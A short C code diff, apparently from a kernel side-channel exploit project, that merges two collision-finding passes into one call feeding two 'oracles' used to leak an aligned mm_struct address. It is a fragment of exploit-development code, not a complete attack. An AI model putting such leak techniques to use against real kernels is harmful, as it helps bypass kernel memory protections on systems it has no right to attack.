@@ -106,8 +106,10 @@ static pid_t clone_leak_child(void) {
     if (getppid() == 1) {
       _exit(1);
     }
-    kernelsnitch_find_collisions_parallel(g_ks);
-    kernelsnitch_find_collisions_parallel(g_ks_verify);
+    /* One pile + one scan feeds both oracles with disjoint collision subsets,
+     * replacing two serial pile/scan passes. Both still bruteforce
+     * independently and must agree on the aligned mm_struct below. */
+    kernelsnitch_find_collisions_parallel_dual(g_ks, g_ks_verify);
     _exit(0);
   }
   return child;
